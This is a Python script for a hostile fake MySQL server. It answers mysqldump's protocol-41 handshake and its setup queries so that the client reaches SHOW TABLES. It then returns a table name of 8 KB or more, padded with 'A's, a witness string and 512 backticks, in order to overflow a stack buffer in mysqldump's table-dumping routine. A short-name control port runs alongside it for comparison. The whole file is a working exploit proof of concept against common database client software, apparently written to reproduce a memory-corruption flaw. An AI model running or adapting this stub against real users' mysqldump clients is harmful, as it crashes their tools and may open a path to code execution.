#!/usr/bin/env python3
"""Hostile MySQL protocol-41 stub: greeting plus SHOW TABLES of chosen length.

mysql_native_password, no SSL. SET/LOCK/FLUSH are OK packets. Session SHOW
VARIABLES and I_S/P_S SELECTs are empty result sets so mysqldump reaches
SHOW TABLES. Later SHOW/SELECT get SQL 1146 so the short-name control dump
exits 2 without a signal.
"""

from __future__ import annotations

import os
import re
import socket
import struct
import threading
import traceback
from dataclasses import dataclass

DEFAULT_WITNESS = "MYSQL-DUMP-SHOW-TABLES-OVERFLOW-WITNESS"
SERVER_VERSION = "26.7.0"
CONTROL_TABLE = b"t"
AUTH_PLUGIN = "mysql_native_password"
TABLES_COLUMN = "Tables_in_testdb"
VERSION_COLUMN = "version()"
EMPTY_COLUMN = "Value"
FIELD_LIST_COLUMN = "Field"
SQL_NO_SUCH_TABLE = 1146
SQLSTATE_NO_SUCH_TABLE = "42S02"
ERR_NO_SUCH_TABLE = "Table 'testdb.t' doesn't exist"

# dump_all_tables_in_db also has bool real_columns[MAX_FIELDS] (4000) on
# the same frame as hash_key[386]; a few KB is absorbed without a signal.
MIN_OVERFLOW_BYTES = 8192
QUOTE_NAME_BACKTICK_PAD = 512
CLIENT_TIMEOUT_SEC = 30.0
LISTEN_BACKLOG = 16
PACKET_HEADER_LEN = 4
HANDSHAKE_RESPONSE_MIN = 32
HANDSHAKE_USER_SKIP = 4 + 4 + 1 + 23
SCRAMBLE_PART1 = 8
RESERVED_FILLER = 10
AUTH_DATA_LEN = 21
COLUMN_FIXED_FIELDS_LEN = 0x0C
COLUMN_MAX_LENGTH = 16 * 1024 * 1024
OK_WARNINGS = 0

PROTOCOL_VERSION = 10
OK_HEADER = 0x00
ERR_HEADER = 0xFF
EOF_HEADER = 0xFE
AUTH_SWITCH_HEADER = 0xFE
NULL_TERM = 0x00

LENENC_MAX_1B = 250
LENENC_2B = 0xFC
LENENC_3B = 0xFD
LENENC_8B = 0xFE
LENENC_2B_LIMIT = 2**16
LENENC_3B_LIMIT = 2**24

CLIENT_LONG_PASSWORD = 1
CLIENT_FOUND_ROWS = 2
CLIENT_LONG_FLAG = 4
CLIENT_CONNECT_WITH_DB = 8
CLIENT_PROTOCOL_41 = 512
CLIENT_TRANSACTIONS = 8192
CLIENT_SECURE_CONNECTION = 32768
CLIENT_MULTI_RESULTS = 1 << 17
CLIENT_PS_MULTI_RESULTS = 1 << 18
CLIENT_PLUGIN_AUTH = 1 << 19
CLIENT_CONNECT_ATTRS = 1 << 20
CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA = 1 << 21
CLIENT_DEPRECATE_EOF = 1 << 24

SERVER_STATUS_AUTOCOMMIT = 0x0002

COM_QUIT = 0x01
COM_INIT_DB = 0x02
COM_QUERY = 0x03
COM_FIELD_LIST = 0x04
COM_STATISTICS = 0x09
COM_PING = 0x0E
COM_RESET_CONNECTION = 0x1F
COM_OK_COMMANDS = (COM_PING, COM_RESET_CONNECTION, COM_STATISTICS)

MYSQL_TYPE_VAR_STRING = 0xFD
CHARSET_UTF8MB4 = 45

SERVER_CAPS = (
    CLIENT_LONG_PASSWORD
    | CLIENT_FOUND_ROWS
    | CLIENT_LONG_FLAG
    | CLIENT_CONNECT_WITH_DB
    | CLIENT_PROTOCOL_41
    | CLIENT_TRANSACTIONS
    | CLIENT_SECURE_CONNECTION
    | CLIENT_MULTI_RESULTS
    | CLIENT_PS_MULTI_RESULTS
    | CLIENT_PLUGIN_AUTH
    | CLIENT_CONNECT_ATTRS
    | CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA
    | CLIENT_DEPRECATE_EOF
)

SCRAMBLE = b"a" * 20

RE_SHOW_TABLES = re.compile(r"\bshow\s+tables\b")
RE_SET = re.compile(r"\bset\b")
RE_SELECT = re.compile(r"\bselect\b")
RE_SHOW = re.compile(r"\bshow\b")
RE_VERSION = re.compile(r"version")
RE_SHOW_VARIABLES = re.compile(r"\bshow\s+variables\b")
RE_SCHEMA_SELECT = re.compile(
    r"information_schema|performance_schema|column_masking_policy"
)


@dataclass(frozen=True)
class StubSettings:
    bind_host: str
    control_port: int
    overflow_port: int
    overflow_bytes: int
    witness: str
    server_version: str = SERVER_VERSION

    @staticmethod
    def from_env() -> StubSettings:
        return StubSettings(
            bind_host=os.environ.get("BIND_HOST", "0.0.0.0"),
            control_port=int(os.environ.get("CONTROL_PORT", "3306")),
            overflow_port=int(os.environ.get("OVERFLOW_PORT", "3307")),
            overflow_bytes=int(os.environ.get("OVERFLOW_BYTES", "65536")),
            witness=os.environ.get("WITNESS", DEFAULT_WITNESS),
        )


@dataclass(frozen=True)
class Packet:
    seq: int
    payload: bytes


@dataclass
class ClientSession:
    sock: socket.socket
    peer: str
    table_name: bytes
    label: str
    deprecate_eof: bool = False


SETTINGS = StubSettings.from_env()
WITNESS = SETTINGS.witness
CONTROL_PORT = SETTINGS.control_port
OVERFLOW_PORT = SETTINGS.overflow_port
BIND_HOST = SETTINGS.bind_host
OVERFLOW_BYTES = SETTINGS.overflow_bytes

_thread_ids = 0
_tid_lock = threading.Lock()


def log(msg: str) -> None:
    print(msg, flush=True)


def next_thread_id() -> int:
    global _thread_ids
    with _tid_lock:
        _thread_ids += 1
        return _thread_ids


def pack_u24(n: int) -> bytes:
    return bytes((n & 0xFF, (n >> 8) & 0xFF, (n >> 16) & 0xFF))


def unpack_u24(data: bytes) -> int:
    return data[0] | (data[1] << 8) | (data[2] << 16)


def lenenc_int(n: int) -> bytes:
    if n <= LENENC_MAX_1B:
        return bytes([n])
    if n < LENENC_2B_LIMIT:
        return bytes([LENENC_2B]) + struct.pack("<H", n)
    if n < LENENC_3B_LIMIT:
        return bytes([LENENC_3B]) + struct.pack("<I", n)[:3]
    return bytes([LENENC_8B]) + struct.pack("<Q", n)


def lenenc_str(data: bytes | str) -> bytes:
    if isinstance(data, str):
        data = data.encode("utf-8")
    return lenenc_int(len(data)) + data


def recvall(sock: socket.socket, n: int) -> bytes | None:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf.extend(chunk)
    return bytes(buf)


def read_packet(sock: socket.socket) -> Packet | None:
    hdr = recvall(sock, PACKET_HEADER_LEN)
    if not hdr:
        return None
    length = unpack_u24(hdr)
    seq = hdr[3]
    payload = recvall(sock, length) if length else b""
    if payload is None:
        return None
    return Packet(seq, payload)


def send_packet(sock: socket.socket, seq: int, payload: bytes) -> int:
    sock.sendall(pack_u24(len(payload)) + bytes([seq & 0xFF]) + payload)
    return seq + 1


def ok_payload(header: int = OK_HEADER) -> bytes:
    return (
        bytes([header, 0x00, 0x00])
        + struct.pack("<H", SERVER_STATUS_AUTOCOMMIT)
        + struct.pack("<H", OK_WARNINGS)
    )


def err_payload(errno: int, sqlstate: str, msg: str) -> bytes:
    return (
        bytes([ERR_HEADER])
        + struct.pack("<H", errno)
        + b"#"
        + sqlstate.encode("ascii")
        + msg.encode("utf-8")
    )


def handshake_payload(thread_id: int) -> bytes:
    caps_low = SERVER_CAPS & 0xFFFF
    caps_high = (SERVER_CAPS >> 16) & 0xFFFF
    payload = bytearray()
    payload.append(PROTOCOL_VERSION)
    payload.extend(SERVER_VERSION.encode("ascii") + b"\x00")
    payload.extend(struct.pack("<I", thread_id))
    payload.extend(SCRAMBLE[:SCRAMBLE_PART1])
    payload.append(NULL_TERM)
    payload.extend(struct.pack("<H", caps_low))
    payload.append(CHARSET_UTF8MB4)
    payload.extend(struct.pack("<H", SERVER_STATUS_AUTOCOMMIT))
    payload.extend(struct.pack("<H", caps_high))
    payload.append(AUTH_DATA_LEN)
    payload.extend(b"\x00" * RESERVED_FILLER)
    payload.extend(SCRAMBLE[SCRAMBLE_PART1:] + b"\x00")
    payload.extend(AUTH_PLUGIN.encode("ascii") + b"\x00")
    return bytes(payload)


def auth_switch_payload() -> bytes:
    return bytes([AUTH_SWITCH_HEADER]) + AUTH_PLUGIN.encode("ascii") + b"\x00" + SCRAMBLE + b"\x00"


def _skip_cstring(payload: bytes, pos: int) -> int | None:
    z = payload.find(b"\x00", pos)
    if z < 0:
        return None
    return z + 1


def _skip_lenenc_auth(payload: bytes, pos: int) -> int | None:
    if pos >= len(payload):
        return None
    first = payload[pos]
    if first <= LENENC_MAX_1B:
        return pos + 1 + first
    if first == LENENC_2B and pos + 3 <= len(payload):
        alen = struct.unpack_from("<H", payload, pos + 1)[0]
        return pos + 3 + alen
    return None


def parse_handshake_response(payload: bytes) -> tuple[int, str]:
    if len(payload) < HANDSHAKE_RESPONSE_MIN:
        return 0, ""
    caps = struct.unpack_from("<I", payload, 0)[0]
    pos = _skip_cstring(payload, HANDSHAKE_USER_SKIP)
    if pos is None:
        return caps, ""
    if caps & CLIENT_PLUGIN_AUTH_LENENC_CLIENT_DATA:
        pos = _skip_lenenc_auth(payload, pos)
        if pos is None:
            return caps, ""
    elif caps & CLIENT_SECURE_CONNECTION:
        if pos >= len(payload):
            return caps, ""
        alen = payload[pos]
        pos += 1 + alen
    else:
        z = payload.find(b"\x00", pos)
        pos = len(payload) if z < 0 else z + 1
    if caps & CLIENT_CONNECT_WITH_DB:
        pos = _skip_cstring(payload, pos)
        if pos is None:
            return caps, ""
    plugin = ""
    if caps & CLIENT_PLUGIN_AUTH:
        z = payload.find(b"\x00", pos)
        if z >= 0:
            plugin = payload[pos:z].decode("ascii", "replace")
    return caps, plugin


def column_def(name: str) -> bytes:
    nb = name.encode("utf-8")
    payload = bytearray()
    payload.extend(lenenc_str(b"def"))
    payload.extend(lenenc_str(b""))
    payload.extend(lenenc_str(b""))
    payload.extend(lenenc_str(b""))
    payload.extend(lenenc_str(nb))
    payload.extend(lenenc_str(nb))
    payload.append(COLUMN_FIXED_FIELDS_LEN)
    payload.extend(struct.pack("<H", CHARSET_UTF8MB4))
    payload.extend(struct.pack("<I", COLUMN_MAX_LENGTH))
    payload.append(MYSQL_TYPE_VAR_STRING)
    payload.extend(struct.pack("<H", 0))
    payload.append(0)
    payload.extend(b"\x00\x00")
    return bytes(payload)


def send_result(
    sock: socket.socket,
    seq: int,
    columns: list[str],
    rows: list[list[bytes]],
    deprecate_eof: bool,
) -> None:
    seq = send_packet(sock, seq, lenenc_int(len(columns)))
    for col in columns:
        seq = send_packet(sock, seq, column_def(col))
    if not deprecate_eof:
        seq = send_packet(sock, seq, ok_payload(EOF_HEADER))
    for row in rows:
        body = b"".join(lenenc_str(cell) for cell in row)
        seq = send_packet(sock, seq, body)
    # mysqldump accepts either closer; keep EOF header for both capability bits.
    send_packet(sock, seq, ok_payload(EOF_HEADER))


def overflow_table_name(witness: str, overflow_bytes: int) -> bytes:
    pad = max(overflow_bytes, MIN_OVERFLOW_BYTES)
    # Long identifier plus witness. Extra backticks also smash quote_name doubling.
    core = ("A" * pad) + witness + ("`" * QUOTE_NAME_BACKTICK_PAD)
    return core.encode("ascii")


def handle_query(session: ClientSession, seq: int, query: str) -> None:
    q = query.strip().strip(";")
    q_l = q.lower()
    log(f"query peer={session.peer} sql={query!r}")
    sock = session.sock
    deprecate_eof = session.deprecate_eof

    if RE_SHOW_TABLES.search(q_l):
        send_result(sock, seq, [TABLES_COLUMN], [[session.table_name]], deprecate_eof)
        return

    # SET / LOCK / FLUSH must be OK packets. Match SET before "information_schema"
    # inside SET SESSION information_schema_stats_expiry.
    if RE_SET.search(q_l) and not RE_SELECT.search(q_l) and not RE_SHOW.search(q_l):
        send_packet(sock, seq, ok_payload())
        return

    if RE_SELECT.search(q_l) and RE_VERSION.search(q_l):
        send_result(
            sock,
            seq,
            [VERSION_COLUMN],
            [[SERVER_VERSION.encode("ascii")]],
            deprecate_eof,
        )
        return

    # Empty result sets (not errors) so mysqldump reaches SHOW TABLES.
    if RE_SHOW_VARIABLES.search(q_l) or (
        RE_SELECT.search(q_l) and RE_SCHEMA_SELECT.search(q_l)
    ):
        send_result(sock, seq, [EMPTY_COLUMN], [], deprecate_eof)
        return

    # Later SHOW/SELECT in dump_table NULL-deref on an empty row; send a
    # SQL error so CONTROL exits 1/2 without a signal.
    if RE_SELECT.search(q_l) or RE_SHOW.search(q_l):
        send_packet(
            sock,
            seq,
            err_payload(SQL_NO_SUCH_TABLE, SQLSTATE_NO_SUCH_TABLE, ERR_NO_SUCH_TABLE),
        )
        return

    send_packet(sock, seq, ok_payload())


def handle_client(
    conn: socket.socket,
    addr: tuple[str, int],
    table_name: bytes,
    label: str,
) -> None:
    peer = f"{addr[0]}:{addr[1]}"
    log(f"accept label={label} peer={peer}")
    conn.settimeout(CLIENT_TIMEOUT_SEC)
    session = ClientSession(conn, peer, table_name, label)
    try:
        tid = next_thread_id()
        send_packet(conn, 0, handshake_payload(tid))
        pkt = read_packet(conn)
        if pkt is None:
            return
        caps, plugin = parse_handshake_response(pkt.payload)
        log(f"handshake label={label} peer={peer} caps=0x{caps:08x} plugin={plugin!r}")
        seq = 2
        if plugin and plugin not in (AUTH_PLUGIN, ""):
            seq = send_packet(conn, seq, auth_switch_payload())
            nxt = read_packet(conn)
            if nxt is None:
                return
            seq = nxt.seq + 1
        send_packet(conn, seq, ok_payload())
        session.deprecate_eof = bool(caps & CLIENT_DEPRECATE_EOF)

        while True:
            pkt = read_packet(conn)
            if pkt is None:
                return
            command = pkt.payload
            if not command:
                continue
            cmd = command[0]
            body = command[1:]
            if cmd == COM_QUIT:
                log(f"quit label={label} peer={peer}")
                return
            if cmd in COM_OK_COMMANDS:
                send_packet(conn, 1, ok_payload())
                continue
            if cmd == COM_INIT_DB:
                db = body.split(b"\x00", 1)[0].decode("utf-8", "replace")
                log(f"init_db label={label} peer={peer} db={db!r}")
                send_packet(conn, 1, ok_payload())
                continue
            if cmd == COM_FIELD_LIST:
                send_result(conn, 1, [FIELD_LIST_COLUMN], [], session.deprecate_eof)
                continue
            if cmd == COM_QUERY:
                sql = body.decode("utf-8", "replace")
                handle_query(session, 1, sql)
                continue
            log(f"unknown-cmd label={label} peer={peer} cmd=0x{cmd:02x} len={len(body)}")
            send_packet(conn, 1, ok_payload())
    except (TimeoutError, socket.timeout, ConnectionResetError, BrokenPipeError, OSError) as exc:
        log(f"disconnect label={label} peer={peer} err={exc}")
    except Exception:
        log(f"stub-error label={label} peer={peer}\n{traceback.format_exc()}")
    finally:
        try:
            conn.close()
        except OSError:
            pass


def serve(port: int, table_name: bytes, label: str) -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((BIND_HOST, port))
    sock.listen(LISTEN_BACKLOG)
    log(f"listen label={label} bind={BIND_HOST}:{port} table_len={len(table_name)}")
    while True:
        conn, addr = sock.accept()
        threading.Thread(
            target=handle_client,
            args=(conn, addr, table_name, label),
            daemon=True,
        ).start()


def main() -> None:
    overflow_name = overflow_table_name(WITNESS, OVERFLOW_BYTES)
    log(
        f"stub start control={BIND_HOST}:{CONTROL_PORT} overflow={BIND_HOST}:{OVERFLOW_PORT} "
        f"overflow_len={len(overflow_name)} witness={WITNESS}"
    )
    threading.Thread(
        target=serve, args=(CONTROL_PORT, CONTROL_TABLE, "control"), daemon=True
    ).start()
    serve(OVERFLOW_PORT, overflow_name, "overflow")


if __name__ == "__main__":
    main()
